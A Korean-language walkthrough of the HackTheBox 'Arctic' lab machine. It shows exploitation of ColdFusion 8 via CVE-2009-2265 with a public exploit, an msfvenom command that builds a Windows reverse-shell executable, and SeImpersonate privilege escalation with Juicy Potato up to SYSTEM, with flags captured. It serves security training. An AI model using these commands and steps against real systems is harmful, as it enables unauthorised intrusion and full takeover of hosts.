# Arctic - HackTheBox
## Recon
```bash
sudo nmap -p 135,8500,49154 -sC -sV -vv -oA arctic 10.10.10.11
```
<img width="1106" height="119" alt="image" src="https://github.com/user-attachments/assets/0cc1128e-1482-46ba-85ed-535b671d4ca4" />

---
## HTTP(8500)
- 8500포트로 접속하면 해당 화면과 같이 나온다.
<img width="1100" height="611" alt="image" src="https://github.com/user-attachments/assets/3cbfa85d-01ff-4e0f-98e1-1b324c13fee0" />

<br>
<br>

- `/CFIDE/administrator`로 접속하면 로그인 화면이 나온다.
- `COLDFUSION 8`
<img width="1100" height="611" alt="image" src="https://github.com/user-attachments/assets/947045fc-9293-4d46-bef9-3eb2225a4097" />

### CVE-2009-2265
- https://nvd.nist.gov/vuln/detail/CVE-2009-2265
- 임의의 경로에 실행파일을 생성하여 명령어를 실행시킬 수 있는 취약점.
<img width="1100" height="393" alt="image" src="https://github.com/user-attachments/assets/6a4b2965-4466-464c-9d4f-f0131d49b17b" />

<br>
<br>

- https://www.exploit-db.com/exploits/50057
- 멀티파트를 구성하여 서버의 특정 경로로 `msfvenom`으로 생성한 `jsp`파일을 업로드 하는 코드.
<img width="1100" height="292" alt="image" src="https://github.com/user-attachments/assets/ccb7152e-595f-4697-95d0-a21648f5b924" />

<br>
<br>

- 아이피 주소와 포트를 변경.
```bash
searchsploit -m 50057
```
<img width="1103" height="150" alt="image" src="https://github.com/user-attachments/assets/573f14bb-8342-418a-b0f3-afb02f1c5e9f" />

<br>
<br>

- 셸 획득.
<img width="1103" height="77" alt="image" src="https://github.com/user-attachments/assets/f469057a-b104-47d4-8675-3154b3800eb4" />

---
## Privesc
- `SeImpersonate`권한 발견.
```cmd
whoami /all
```
<img width="1103" height="192" alt="image" src="https://github.com/user-attachments/assets/b9e925aa-762e-40e9-a85a-822c67d6a815" />

<br>
<br>

- `msfvenom`으로 리버스 셸 `shell.exe`파일을 생성.
```bash
msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=80 -f exe -o shell.exe
```
<img width="1103" height="165" alt="image" src="https://github.com/user-attachments/assets/26671b78-e94f-4c86-819f-54137f6c568b" />

<br>
<br>

- https://github.com/ohpe/juicy-potato
- `Juicy Potato` 와 `shell.exe`을 로컬로부터 다운로드.
<img width="1103" height="165" alt="image" src="https://github.com/user-attachments/assets/39d78d96-50db-479d-87f3-f8fc5cf109c7" />

<br>
<br>

- `Juicy Potato` 실행.
```cmd
.\juicypotato.exe -t * -p shell.exe -l 443
```
<img width="1103" height="165" alt="image" src="https://github.com/user-attachments/assets/0b3c077e-4c26-4d11-a059-b4cda471e2ab" />

<br>
<br>

- `nt authority\system` 셸 획득.
<img width="1103" height="207" alt="image" src="https://github.com/user-attachments/assets/685ea650-281a-4f0d-b734-4d6e9cdfaf05" />

---
## FLAG
- `c:\users\tolis\desktop\user.txt`
<img width="1103" height="239" alt="image" src="https://github.com/user-attachments/assets/e7bed86e-b90b-43f4-95ad-33e401b0aa2c" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1103" height="239" alt="image" src="https://github.com/user-attachments/assets/f425f5f4-59ac-40f4-a85f-453f3b7acea7" />














